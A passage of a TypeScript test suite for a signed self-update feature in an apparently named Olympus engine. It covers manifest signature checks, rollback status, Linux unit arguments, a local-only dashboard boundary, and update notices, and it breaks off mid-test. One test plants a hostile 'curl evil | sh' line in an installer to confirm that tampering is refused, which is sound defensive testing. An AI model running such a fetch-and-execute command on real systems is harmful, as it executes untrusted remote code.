// Update now (#1063): the signed release manifest, the engine's own update
// run, its progress record across the restart, and the local-only boundary.
// Every key here is a throwaway generated inside the test.

import { afterEach, describe, expect, test } from 'bun:test';
import { generateKeyPairSync, type KeyObject } from 'node:crypto';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Window } from 'happy-dom';
import {
  RELEASE_SIGNING_PUBLIC_KEY, releasePublicKey, verifySignedReleaseManifest,
} from '../src/core/release-signing.ts';
import { createSelfUpdater, linuxSelfUpdateRunArgs, type SelfUpdaterOptions } from '../src/core/self-update.ts';
import { linuxEngineEnvironment, resolveLinuxEngineLayout } from '../src/core/linux-engine-layout.ts';
import { renderEngineSystemdUnit } from '../src/core/linux-engine-service.ts';
import { recordRequestPeer } from '../src/core/request-peer.ts';
import { DashboardLaunchTickets } from '../src/core/dashboard-launch.ts';
import { createEmailSourceWorker } from '../src/workers/email-source/index.ts';
import { renderComputerHostPage } from '../src/workers/dashboard/host-page.ts';
import { renderDashboardSettingsPage } from '../src/workers/dashboard/pages/local.ts';
import {
  DASHBOARD_CONTROL_GRADE_CONTEXT_HEADER, DASHBOARD_LOCAL_CONTROL_SESSION_PATH, DASHBOARD_SELF_UPDATE_PATHS, withWorkerBearerAuth,
} from '../src/workers/http.ts';
import { checkSite, loadSigningKey, publicKeyPem, signInstaller } from '../scripts/sign-release-manifest.ts';
import { createTestClock, flushMicrotasks, waitFor } from './helpers/test-clock.ts';
import { ownerLocalMint } from './helpers/owner-local-mint.ts';

const dirs: string[] = [];
afterEach(() => { while (dirs.length) rmSync(dirs.pop()!, { recursive: true, force: true }); });
function tempDir(): string { const dir = mkdtempSync(join(tmpdir(), 'self-update-')); dirs.push(dir); return dir; }

function keyPair(): { privateKey: KeyObject; publicPem: string } {
  const { privateKey } = generateKeyPairSync('ed25519');
  return { privateKey, publicPem: publicKeyPem(privateKey) };
}

const SHA = (c: string) => c.repeat(64);
function installerText(version: string, extra = ''): string {
  return `#!/bin/sh\nset -eu\nOLYMPUS_VERSION=${version}\nOLYMPUS_SHA256=${SHA('a')}\nOLYMPUS_BYTES=1234\nWHATSAPP_BRIDGE_NAME=olympus-whatsapp-bridge-0123456789abcdef\nWHATSAPP_BRIDGE_SHA256=${SHA('b')}\nWHATSAPP_BRIDGE_BYTES=99\nMACOS_HELPER_NAME=none\nMACOS_HELPER_SHA256=none\nMACOS_HELPER_BYTES=0\nMACOS_HELPER_TEAM_ID=none\n${extra}main() { :; }\nmain "$@"\n`;
}

/** A rendered installer and its signed manifest, as the release tooling writes them. */
function release(version: string, key = keyPair(), name = 'install.sh') {
  const site = tempDir();
  const installerPath = join(site, name);
  writeFileSync(installerPath, installerText(version));
  const envelope = signInstaller(installerPath, key.privateKey, key.publicPem);
  return { installer: readFileSync(installerPath, 'utf8'), envelope, key, installerPath };
}

describe('the signed release manifest', () => {
  test('ships a clearly marked placeholder, not a key: no release key is configured yet', () => {
    expect(RELEASE_SIGNING_PUBLIC_KEY).toBeUndefined();
    expect(readFileSync('src/core/release-signing.ts', 'utf8')).toContain('PLACEHOLDER: no release signing key exists yet.');
    expect(releasePublicKey()).toBeUndefined();
  });

  test('a manifest signed with the release key verifies; another key, or no key, does not', () => {
    const { envelope, key } = release('1.5.1');
    const ok = verifySignedReleaseManifest(envelope, key.publicPem);
    expect(ok.ok).toBe(true);
    if (ok.ok) {
      expect(ok.manifest.version).toBe('1.5.1');
      expect(ok.manifest.platform).toBe('darwin-arm64');
      expect(ok.manifest.artifacts.map(item => item.name)).toEqual(['olympus-1.5.1.tgz', 'olympus-whatsapp-bridge-0123456789abcdef-darwin-arm64']);
    }
    expect(verifySignedReleaseManifest(envelope, keyPair().publicPem)).toEqual({ ok: false, reason: 'bad_signature' });
    expect(verifySignedReleaseManifest(envelope, undefined)).toEqual({ ok: false, reason: 'no_key' });
  });

  test('a manifest changed after signing fails the signature', () => {
    const { envelope, key } = release('1.5.1');
    const outer = JSON.parse(envelope) as { manifest: string };
    const changed = Buffer.from(outer.manifest, 'base64').toString('utf8').replace('"1.5.1"', '"1.5.2"');
    const tampered = JSON.stringify({ ...JSON.parse(envelope), manifest: Buffer.from(changed).toString('base64') });
    expect(verifySignedReleaseManifest(tampered, key.publicPem)).toEqual({ ok: false, reason: 'bad_signature' });
    expect(verifySignedReleaseManifest('not json', key.publicPem)).toEqual({ ok: false, reason: 'malformed' });
  });

  test('the signing script refuses a key the engine does not ship, and never signs the template', () => {
    const site = tempDir();
    writeFileSync(join(site, 'install.sh'), installerText('1.5.1'));
    const key = keyPair();
    expect(() => signInstaller(join(site, 'install.sh'), key.privateKey, undefined)).toThrow('ships no release public key');
    expect(() => signInstaller(join(site, 'install.sh'), key.privateKey, keyPair().publicPem)).toThrow('not the release key the engine ships');
    writeFileSync(join(site, 'install.sh'), installerText('@OLYMPUS_VERSION@'));
    expect(() => signInstaller(join(site, 'install.sh'), key.privateKey, key.publicPem)).toThrow('template');
  });

  test('the signing key comes only from the operator, and must be Ed25519', () => {
    expect(() => loadSigningKey({ env: {} })).toThrow('No release signing key');
    const dir = tempDir();
    const { privateKey } = generateKeyPairSync('ed25519');
    const path = join(dir, 'key.pem');
    writeFileSync(path, privateKey.export({ type: 'pkcs8', format: 'pem' }));
    expect(loadSigningKey({ env: { OLYMPUS_RELEASE_SIGNING_KEY_FILE: path } }).asymmetricKeyType).toBe('ed25519');
    const rsa = generateKeyPairSync('rsa', { modulusLength: 2048 }).privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
    expect(() => loadSigningKey({ env: { OLYMPUS_RELEASE_SIGNING_KEY: rsa } })).toThrow('Ed25519');
  });

  test('deploy check: nothing required without a shipped key; with one, a missing or stale manifest is refused', () => {
    const root = tempDir();
    mkdirSync(join(root, 'site'));
    const key = keyPair();
    writeFileSync(join(root, 'site', 'install.sh'), installerText('1.5.1'));
    expect(checkSite(root, undefined)).toEqual([]);
    expect(checkSite(root, key.publicPem)[0]).toContain('is missing');
    writeFileSync(join(root, 'site', 'install.sh.release.json'), signInstaller(join(root, 'site', 'install.sh'), key.privateKey, key.publicPem));
    expect(checkSite(root, key.publicPem)).toEqual([]);
    writeFileSync(join(root, 'site', 'install.sh'), installerText('1.5.1', 'echo changed\n'));
    expect(checkSite(root, key.publicPem)[0]).toContain('does not match');
  });
});

function updater(input: { installer: string; envelope: string; key?: string | undefined } & Partial<SelfUpdaterOptions>) {
  const clock = createTestClock();
  const stateDir = join(tempDir(), 'updates');
  const launched: { runner: string; dir: string }[] = [];
  const fetched: string[] = [];
  const base: SelfUpdaterOptions = {
    platform: 'darwin', runningVersion: '1.5.0', stateDir, standaloneEngine: true,
    available: () => ({ version: '1.5.1' }),
    publicKeyPem: input.key,
    now: clock.now, pid: 100,
    fetchImpl: (async (url: string | URL | Request) => {
      fetched.push(String(url));
      return new Response(String(url).endsWith('.release.json') ? input.envelope : input.installer);
    }) as unknown as typeof fetch,
    launch: async (runner, dir) => { launched.push({ runner, dir }); },
  };
  const options = { ...base, ...Object.fromEntries(Object.entries(input).filter(([k]) => !['installer', 'envelope', 'key'].includes(k))) } as SelfUpdaterOptions;
  return { self: createSelfUpdater(options), options, clock, stateDir, launched, fetched };
}

describe('Update now in the engine', () => {
  test('with no release key the update refuses, and downloads nothing', () => {
    const r = release('1.5.1');
    const u = updater({ installer: r.installer, envelope: r.envelope, key: undefined });
    expect(u.self.start()).toEqual({ ok: false, refusal: 'no_release_key' });
    expect(u.fetched).toEqual([]);
    expect(u.self.status()).toEqual({ state: 'idle' });
  });

  test('only the standalone engine on a supported platform updates itself', () => {
    const r = release('1.5.1');
    expect(updater({ ...r, key: r.key.publicPem, standaloneEngine: false }).self.start()).toEqual({ ok: false, refusal: 'not_available' });
    expect(updater({ ...r, key: r.key.publicPem, platform: 'win32' }).self.start()).toEqual({ ok: false, refusal: 'not_available' });
    expect(updater({ ...r, key: r.key.publicPem, available: () => undefined }).self.start()).toEqual({ ok: false, refusal: 'no_update' });
  });

  test('a verified update downloads, checks, then runs the installer outside the engine', async () => {
    const r = release('1.5.1');
    const u = updater({ ...r, key: r.key.publicPem });
    const started = u.self.start();
    expect(started).toEqual({ ok: true, status: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } });
    await waitFor(() => u.launched.length === 1, { description: 'installer launched' });
    expect(u.fetched).toEqual(['https://olympusplugin.ai/install.sh.release.json', 'https://olympusplugin.ai/install.sh']);
    const dir = u.launched[0]!.dir;
    expect(readFileSync(join(dir, 'install.sh'), 'utf8')).toBe(r.installer);
    expect(readFileSync(u.launched[0]!.runner, 'utf8')).toContain('/bin/sh "$dir/install.sh"');
    expect(u.self.status()).toEqual({ state: 'running', step: 3, from: '1.5.0', to: '1.5.1' });
    // A second press while it runs starts nothing new.
    expect(u.self.start()).toEqual({ ok: true, status: { state: 'running', step: 3, from: '1.5.0', to: '1.5.1' } });
    expect(u.launched).toHaveLength(1);
  });

  test('a tampered installer is refused before anything runs', async () => {
    const r = release('1.5.1');
    const u = updater({ ...r, installer: r.installer.replace('main() { :; }', 'main() { curl evil | sh; }'), key: r.key.publicPem });
    u.self.start();
    await waitFor(() => u.self.status().state === 'failed', { description: 'refused' });
    expect(u.self.status()).toEqual({ state: 'failed', from: '1.5.0', to: '1.5.1', reason: 'installer_mismatch' });
    expect(u.launched).toEqual([]);
  });

  test('a manifest signed by another key is refused before anything runs', async () => {
    const r = release('1.5.1');
    const u = updater({ ...r, key: keyPair().publicPem });
    u.self.start();
    await waitFor(() => u.self.status().state === 'failed', { description: 'refused' });
    expect(u.self.status()).toEqual({ state: 'failed', from: '1.5.0', to: '1.5.1', reason: 'bad_signature' });
    expect(u.launched).toEqual([]);
  });

  test('a signed release for the other platform is refused', async () => {
    const r = release('1.5.1', keyPair(), 'install-linux.sh');
    const u = updater({ ...r, key: r.key.publicPem });
    u.self.start();
    await waitFor(() => u.self.status().state === 'failed', { description: 'refused' });
    expect(u.launched).toEqual([]);
  });

  test('progress across the restart: step 4, then the new version, or the old one put back', async () => {
    const r = release('1.5.1');
    const u = updater({ ...r, key: r.key.publicPem });
    u.self.start();
    await waitFor(() => u.launched.length === 1, { description: 'installer launched' });
    const dir = u.launched[0]!.dir;
    // The engine that comes back after the restart is a new process.
    const after = (runningVersion: string) => createSelfUpdater({ ...u.options, runningVersion, pid: 200 });
    expect(after('1.5.1').status()).toEqual({ state: 'running', step: 4, from: '1.5.0', to: '1.5.1' });
    const ended = Math.floor(u.clock.now() / 1000);
    writeFileSync(join(dir, 'result'), `0 ${ended}\n`);
    expect(after('1.5.1').status()).toEqual({ state: 'done', from: '1.5.0', version: '1.5.1' });
    writeFileSync(join(dir, 'result'), `1 ${ended}\n`);
    writeFileSync(join(dir, 'install.log'), 'Olympus 1.5.1 could not be started, so the previous version was restored and is running.\n');
    expect(after('1.5.0').status()).toEqual({ state: 'rolled_back', from: '1.5.0', to: '1.5.1' });
    // Linux: the lifecycle's restore line, reported through install-linux.sh.
    writeFileSync(join(dir, 'install.log'), 'Olympus was not installed or upgraded: Lifecycle install failed (status 1). The engine did not prove build abc healthy within 60 s: timeout. Previous installation restoration proved healthy.\n');
    expect(u.self.status()).toEqual({ state: 'rolled_back', from: '1.5.0', to: '1.5.1' });
    // In the same engine process, a restore that itself failed is not a rollback.
    writeFileSync(join(dir, 'install.log'), 'Previous installation restoration failed: timeout.\n');
    expect(u.self.status()).toEqual({ state: 'failed', from: '1.5.0', to: '1.5.1', reason: 'install_failed' });
    // Structured: a new engine process on the old version means the old version was put back, whatever the log says.
    expect(after('1.5.0').status()).toEqual({ state: 'rolled_back', from: '1.5.0', to: '1.5.1' });
    // The same engine still running after a failure: nothing was swapped.
    writeFileSync(join(dir, 'install.log'), 'Olympus was not installed or upgraded: Release download failed.\n');
    expect(u.self.status()).toEqual({ state: 'failed', from: '1.5.0', to: '1.5.1', reason: 'install_failed' });
    // Once shown long enough, the record goes quiet.
    await u.clock.advance(11 * 60_000);
    expect(createSelfUpdater({ ...u.options, runningVersion: '1.5.0', pid: 200, now: u.clock.now }).status()).toEqual({ state: 'idle' });
  });

  test('an installer that never reports is called unfinished, not running forever', async () => {
    const r = release('1.5.1');
    const u = updater({ ...r, key: r.key.publicPem });
    u.self.start();
    await waitFor(() => u.launched.length === 1, { description: 'installer launched' });
    await u.clock.advance(31 * 60_000);
    expect(u.self.status()).toEqual({ state: 'failed', from: '1.5.0', to: '1.5.1', reason: 'did_not_finish' });
  });
});

describe('Update now on Linux runs in the engine\'s own layout', () => {
  test('the transient unit gets every layout variable the engine unit sets', () => {
    const layout = resolveLinuxEngineLayout({ HOME: '/home/u', XDG_CONFIG_HOME: '/srv/u/config', XDG_DATA_HOME: '/srv/u/data', XDG_STATE_HOME: '/srv/u/state', XDG_CACHE_HOME: '/srv/u/cache', XDG_RUNTIME_DIR: '/run/user/1000' });
    const args = linuxSelfUpdateRunArgs('/s/run/runner.sh', '/s/run/0123456789abcdef', linuxEngineEnvironment(layout));
    expect(args).toEqual([
      '--user', '--collect', '--quiet', '--unit=olympus-update-0123456789abcdef',
      '--setenv=HOME=/home/u',
      '--setenv=XDG_CONFIG_HOME=/srv/u/config',
      '--setenv=XDG_DATA_HOME=/srv/u/data',
      '--setenv=XDG_STATE_HOME=/srv/u/state',
      '--setenv=XDG_CACHE_HOME=/srv/u/cache',
      '--setenv=XDG_RUNTIME_DIR=/run/user/1000',
      '--setenv=OLYMPUS_SOVEREIGNTY_CONFIG=/srv/u/config/olympus/sovereignty.json',
      '--', '/bin/sh', '/s/run/runner.sh', '/s/run/0123456789abcdef',
    ]);
    // The same layout the engine unit carries, so the two cannot drift apart.
    const unit = renderEngineSystemdUnit(layout, { runtimePath: '/opt/bun', entryPath: '/opt/olympus.js', workingDirectory: '/home/u' } as Parameters<typeof renderEngineSystemdUnit>[1]);
    const environment = unit.split('\n').find(line => line.startsWith('Environment='))!;
    const unitVars = [...environment.matchAll(/"([A-Z_]+)=([^"]*)"/g)].map(m => [m[1]!, m[2]!] as const)
      .filter(([name]) => name === 'HOME' || name.startsWith('XDG_') || name === 'OLYMPUS_SOVEREIGNTY_CONFIG');
    expect(args.filter(arg => arg.startsWith('--setenv=')).map(arg => arg.slice('--setenv='.length))).toEqual(unitVars.map(([name, value]) => `${name}=${value}`));
  });
});

describe('Update now is this computer\'s own: never the bearer, a launch link or a remote browser', () => {
  const TOKEN = 'self-update-boundary-secret';
  const ORIGIN = 'http://127.0.0.1:28193';
  function fixture() {
    const calls: string[] = [];
    const worker = createEmailSourceWorker({
      platform: 'darwin',
      updateAvailable: () => ({ version: '1.5.1' }),
      selfUpdate: {
        start() { calls.push('start'); return { ok: true, status: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } }; },
        status() { calls.push('status'); return { state: 'idle' }; },
      },
    });
    const clock = createTestClock(Date.parse('2026-11-10T12:00:00.000Z'));
    const fetch = withWorkerBearerAuth((request: Request) => worker.fetch(request), { authToken: TOKEN, now: clock.now, launchTickets: new DashboardLaunchTickets({ now: clock.now }) });
    return { fetch, calls, worker };
  }
  const post = (path: string, headers: Record<string, string>) => new Request(`${ORIGIN}${path}`, { method: 'POST', headers: { 'Content-Type': 'application/json', Origin: ORIGIN, ...headers }, body: '{}' });
  const cookieOf = (response: Response) => (response.headers.get('Set-Cookie') ?? '').split(';')[0] ?? '';

  test('the bearer, a bearer-minted session and a forged grade header are refused; nothing starts', async () => {
    const f = fixture();
    const mint = await f.fetch(new Request(`${ORIGIN}/dashboard/control/session`, { method: 'POST', headers: { Authorization: `Bearer ${TOKEN}`, Origin: ORIGIN } }));
    const session = { Cookie: cookieOf(mint), 'X-Olympus-CSRF': ((await mint.json()) as { csrf_token: string }).csrf_token };
    for (const path of Object.values(DASHBOARD_SELF_UPDATE_PATHS)) {
      expect((await f.fetch(post(path, { Authorization: `Bearer ${TOKEN}` }))).status).toBe(403);
      expect((await f.fetch(post(path, { Authorization: `Bearer ${TOKEN}`, [DASHBOARD_CONTROL_GRADE_CONTEXT_HEADER]: 'local' }))).status).toBe(403);
      expect((await f.fetch(post(path, session))).status).toBe(403);
      expect((await f.fetch(post(path, {}))).status).toBe(401);
    }
    expect(f.calls).toEqual([]);
    f.worker.close();
  });

  test('a remote browser cannot mint the local session that Update now needs', async () => {
    const f = fixture();
    const remote = new Request(`${ORIGIN}${DASHBOARD_LOCAL_CONTROL_SESSION_PATH}`, { method: 'POST', headers: { Origin: ORIGIN } });
    recordRequestPeer(remote, '203.0.113.9');
    expect((await f.fetch(remote)).status).toBe(403);
    f.worker.close();
  });

  test('this computer\'s unlocked dashboard starts it and reads its progress', async () => {
    const f = fixture();
    // Minted as the owner's browser does it: from the control session its launch opened (#1153).
    const minted = await ownerLocalMint(f.fetch, ORIGIN, TOKEN);
    expect(minted.status).toBe(200);
    const session = { Cookie: cookieOf(minted), 'X-Olympus-CSRF': ((await minted.json()) as { csrf_token: string }).csrf_token };
    const started = await f.fetch(post(DASHBOARD_SELF_UPDATE_PATHS.start, session));
    expect(started.status).toBe(200);
    expect(await started.json()).toEqual({ ok: true, update: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } });
    expect((await f.fetch(post(DASHBOARD_SELF_UPDATE_PATHS.status, session))).status).toBe(200);
    expect(f.calls).toEqual(['start', 'status']);
    f.worker.close();
  });
});

describe('the notice on Home and Settings', () => {
  test('Home: "Olympus X is available." with Update now, and the Terminal command as a fallback', () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, csrfToken: 'c', localSession: true });
    expect(html).toContain('Olympus 1.5.1 is available.');
    expect(html).toContain('data-update-now');
    expect(html).toContain('Update in Terminal instead');
    expect(html).toContain('curl -fsSL https://olympusplugin.ai/install.sh | sh');
    expect(html).not.toContain('To update, run this in Terminal:');
  });

  test('without Update now (a hosted plugin) the notice shows the Terminal command open', () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'linux', updateAvailable: { version: '1.5.1' } });
    expect(html).not.toMatch(/<button[^>]*data-update-now/);
    expect(html).toMatch(/<details class="upd-terminal" data-update-terminal open>/);
  });

  test('a reload mid-update shows the step, the bar and the rollback promise', () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, updateStatus: { state: 'running', step: 2, from: '1.5.0', to: '1.5.1' } });
    expect(html).toContain('Updating to Olympus 1.5.1');
    expect(html).toContain("step 2 of 4: checking the download&#39;s signature".replace('&#39;', "'"));
    expect(html).toContain("If 1.5.1 doesn't start, Olympus puts 1.5.0 back by itself.");
    expect(html).toContain('width:50%');
  });

  test('a rollback says which version was put back', () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, updateStatus: { state: 'rolled_back', from: '1.5.0', to: '1.5.1' } });
    expect(html).toContain("Olympus 1.5.1 didn't start, so Olympus put 1.5.0 back.");
  });

  test('a rollback drawn before the update check still offers the retry once the check finds the version', async () => {
    // A worker that just restarted has an empty update cache, so the page is
    // drawn with no version; Home's health read brings Update now back.
    const window = new Window({ url: 'http://localhost', settings: { enableJavaScriptEvaluation: true } });
    Object.defineProperty(window, 'setInterval', { value: () => 1 });
    Object.defineProperty(window, 'setTimeout', { value: () => 1 });
    Object.defineProperty(window, 'fetch', { value: async () => new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } })) });
    try {
      window.document.write(renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', selfUpdate: true, csrfToken: 'c', localSession: true, updateStatus: { state: 'rolled_back', from: '1.5.0', to: '1.5.1' } }));
      window.document.close();
      const button = window.document.querySelector('[data-update-now]') as unknown as HTMLButtonElement;
      const notice = window.document.querySelector('[data-update-notice]')!;
      await waitFor(() => !button.hidden, { description: 'retry offered after the health read' });
      expect(notice.getAttribute('data-update-version')).toBe('1.5.1');
      expect(notice.getAttribute('data-update-state')).toBe('rolled_back');
      expect(window.document.querySelector('[data-update-title]')!.textContent).toContain("Olympus 1.5.1 didn't start, so Olympus put 1.5.0 back.");
    } finally { await window.happyDOM.close(); }
  });

  test('Settings › Updates carries the same notice', () => {
    const html = renderDashboardSettingsPage({ settings: { update: { version: '1.5.1', command: 'curl -fsSL https://olympusplugin.ai/install.sh | sh' }, updater: { command: 'curl -fsSL https://olympusplugin.ai/install.sh | sh', selfUpdate: true } } });
    expect(html).toContain('Olympus 1.5.1 is available.');
    expect(html).toContain('data-update-now');
  });

  test('the page walks the four steps, through the restart, to the new version', async () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, csrfToken: 'c', localSession: true });
    const window = new Window({ url: 'http://localhost', settings: { enableJavaScriptEvaluation: true } });
    const timers: (() => void)[] = [];
    // Only the notice's 2-second status poll is held; happy-dom's own timers run.
    const realTimeout = window.setTimeout.bind(window);
    Object.defineProperty(window, 'setTimeout', { value: (callback: () => void, delay?: number) => {
      if (delay !== 2000) return realTimeout(callback, delay);
      timers.push(callback); return timers.length;
    } });
    Object.defineProperty(window, 'setInterval', { value: () => 1 });
    const answers: (object | 'down')[] = [
      { ok: true, update: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } },
      { ok: true, update: { state: 'running', step: 2, from: '1.5.0', to: '1.5.1' } },
      { ok: true, update: { state: 'running', step: 3, from: '1.5.0', to: '1.5.1' } },
      'down',
      { ok: true, update: { state: 'done', from: '1.5.0', version: '1.5.1' } },
    ];
    const paths: string[] = [];
    Object.defineProperty(window, 'fetch', { value: async (url: string) => {
      if (url === '/v1/health') return new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } }));
      paths.push(url);
      const next = answers.shift();
      if (next === 'down') throw new TypeError('Failed to fetch');
      return new window.Response(JSON.stringify(next));
    } });
    try {
      window.document.write(html); window.document.close();
      const notice = () => window.document.querySelector('[data-update-notice]')!;
      const say = () => notice().querySelector('[data-update-text]')!.textContent;
      (notice().querySelector('[data-update-now]') as unknown as HTMLButtonElement).click();
      await waitFor(() => say()!.includes('step 1 of 4'), { description: 'step 1' });
      for (const step of [2, 3]) {
        await waitFor(() => timers.length > 0, { description: 'next poll' }); timers.shift()!();
        await waitFor(() => say()!.includes(`step ${step} of 4`), { description: `step ${step}` });
      }
      await waitFor(() => timers.length > 0, { description: 'next poll' }); timers.shift()!();
      await waitFor(() => say()!.includes('step 4 of 4: restarting Olympus'), { description: 'restart' });
      await waitFor(() => timers.length > 0, { description: 'next poll' }); timers.shift()!();
      await waitFor(() => say() === 'Olympus 1.5.1 is running.', { description: 'done' });
      expect(notice().getAttribute('data-update-state')).toBe('done');
      expect(paths[0]).toBe(DASHBOARD_SELF_UPDATE_PATHS.start);
      expect(paths.slice(1).every(path => path === DASHBOARD_SELF_UPDATE_PATHS.status)).toBe(true);
    } finally { await window.happyDOM.close(); }
  });

  test('Update now on a page with a bearer or launch session reloads to share the new local session, then starts once', async () => {
    // The local mint replaces the control cookie, so Home's tools and Settings
    // would keep a dead CSRF token: the page reloads before the update starts.
    const page = (csrfToken: string, localSession: boolean) => renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, csrfToken, localSession });
    const calls: { url: string; csrf: string | null }[] = [];
    let healthReads = 0;
    const open = (html: string, resume?: string) => {
      const window = new Window({ url: resume ? 'http://localhost/dashboard#olympus-update-now' : 'http://localhost/dashboard?token=dash_t&tab=home', settings: { enableJavaScriptEvaluation: true } });
      let reloads = 0;
      Object.defineProperty(window.location, 'reload', { value: () => { reloads++; } });
      Object.defineProperty(window, 'setInterval', { value: () => 1 });
      Object.defineProperty(window, 'setTimeout', { value: () => 1 });
      Object.defineProperty(window, 'fetch', { value: async (url: string, init?: { headers?: Record<string, string> }) => {
        if (url === '/v1/health') { healthReads++; return new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } })); }
        calls.push({ url, csrf: init?.headers?.['X-Olympus-CSRF'] ?? null });
        if (url === DASHBOARD_LOCAL_CONTROL_SESSION_PATH) return new window.Response(JSON.stringify({ csrf_token: 'local-c' }));
        return new window.Response(JSON.stringify({ ok: true, update: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } }));
      } });
      window.document.write(html); window.document.close();
      return { window, reloads: () => reloads };
    };
    const before = open(page('bearer-c', false));
    try {
      (before.window.document.querySelector('[data-update-now]') as unknown as HTMLButtonElement).click();
      await waitFor(() => before.reloads() === 1, { description: 'reload after the new session' });
      expect(calls).toEqual([{ url: DASHBOARD_LOCAL_CONTROL_SESSION_PATH, csrf: null }]);
      // The one-shot mark rides on the address's fragment, never in browser storage.
      expect(before.window.location.hash).toBe('#olympus-update-now');
      // A launch token in the address is dropped, so the reload takes the new local session.
      expect(before.window.location.search).toBe('?tab=home');
      expect(before.window.sessionStorage.length).toBe(0);
    } finally { await before.window.happyDOM.close(); }
    // The reloaded page holds the local session everywhere and carries on.
    calls.length = 0;
    const after = open(page('local-c', true), '1');
    try {
      await waitFor(() => calls.length === 1, { description: 'update started after the reload' });
      expect(calls).toEqual([{ url: DASHBOARD_SELF_UPDATE_PATHS.start, csrf: 'local-c' }]);
      expect(after.window.location.hash).toBe('');
      expect(after.window.location.pathname).toBe('/dashboard');
      expect(after.reloads()).toBe(0);
    } finally { await after.window.happyDOM.close(); }
    // A later visit with no click behind it starts nothing.
    calls.length = 0;
    healthReads = 0;
    const later = open(page('local-c', true));
    try {
      await waitFor(() => healthReads > 0, { description: 'Home health read on the later visit' });
      await flushMicrotasks();
      expect(calls).toEqual([]);
    } finally { await later.window.happyDOM.close(); }
  });

  test('Home: an update found after the page was drawn still starts after the session reload', async () => {
    // The page is drawn before the delayed update check; Home's own health
    // read then shows Update now. The click must survive the reload.
    const window = new Window({ url: 'http://localhost', settings: { enableJavaScriptEvaluation: true } });
    let reloads = 0;
    Object.defineProperty(window.location, 'reload', { value: () => { reloads++; } });
    Object.defineProperty(window, 'setInterval', { value: () => 1 });
    Object.defineProperty(window, 'fetch', { value: async (url: string) => url === '/v1/health'
      ? new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } }))
      : new window.Response(JSON.stringify({ csrf_token: 'local-c' })) });
    try {
      window.document.write(renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', selfUpdate: true, csrfToken: 'bearer-c', localSession: false }));
      window.document.close();
      const button = window.document.querySelector('[data-update-now]') as unknown as HTMLButtonElement;
      await waitFor(() => !button.hidden, { description: 'Update now shown by the health read' });
      expect(window.document.querySelector('[data-update-notice]')!.getAttribute('data-update-version')).toBe('1.5.1');
      button.click();
      await waitFor(() => reloads === 1, { description: 'reload after the new session' });
      expect(window.location.hash).toBe('#olympus-update-now');
    } finally { await window.happyDOM.close(); }
  });

  test('the reload after Update now keeps the pane the click came from (Settings › Updates)', async () => {
    const page = (csrfToken: string, localSession: boolean) => renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, csrfToken, localSession });
    const starts: string[] = [];
    const open = (url: string, html: string) => {
      const window = new Window({ url, settings: { enableJavaScriptEvaluation: true } });
      Object.defineProperty(window.location, 'reload', { value: () => {} });
      Object.defineProperty(window, 'setInterval', { value: () => 1 });
      Object.defineProperty(window, 'setTimeout', { value: () => 1 });
      Object.defineProperty(window, 'fetch', { value: async (target: string) => {
        if (target === '/v1/health') return new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } }));
        if (target === DASHBOARD_LOCAL_CONTROL_SESSION_PATH) return new window.Response(JSON.stringify({ csrf_token: 'local-c' }));
        starts.push(target);
        return new window.Response(JSON.stringify({ ok: true, update: { state: 'running', step: 1, from: '1.5.0', to: '1.5.1' } }));
      } });
      window.document.write(html); window.document.close();
      return window;
    };
    const before = open('http://localhost/dashboard?settings&token=dash_t#updates', page('bearer-c', false));
    let marked = '';
    try {
      (before.document.querySelector('[data-update-now]') as unknown as HTMLButtonElement).click();
      await waitFor(() => before.location.hash.startsWith('#olympus-update-now'), { description: 'mark set' });
      marked = before.location.hash;
    } finally { await before.happyDOM.close(); }
    expect(marked).toBe('#olympus-update-now~updates');
    const after = open('http://localhost/dashboard?settings' + marked, page('local-c', true));
    try {
      await waitFor(() => starts.length === 1, { description: 'update started after the reload' });
      // The Updates pane is shown again, so its progress and outcome are visible.
      expect(after.location.hash).toBe('#updates');
      expect(after.location.search).toMatch(/^\?settings=?$/);
    } finally { await after.happyDOM.close(); }
  });

  test('a refused update shows the reason beside the button', async () => {
    const html = renderComputerHostPage({ panelHtml: '<p>panel</p>', origin: 'http://localhost', platform: 'darwin', updateAvailable: { version: '1.5.1' }, selfUpdate: true, csrfToken: 'c', localSession: true });
    const window = new Window({ url: 'http://localhost', settings: { enableJavaScriptEvaluation: true } });
    Object.defineProperty(window, 'setInterval', { value: () => 1 });
    Object.defineProperty(window, 'fetch', { value: async (url: string) => url === '/v1/health'
      ? new window.Response(JSON.stringify({ update_available: { version: '1.5.1' } }))
      : new window.Response(JSON.stringify({ ok: false, error: { code: 'no_release_key', message: 'no key words' } }), { status: 409 }) });
    try {
      window.document.write(html); window.document.close();
      (window.document.querySelector('[data-update-now]') as unknown as HTMLButtonElement).click();
      await waitFor(() => window.document.querySelector('[data-update-note]')!.textContent === 'no key words', { description: 'refusal shown' });
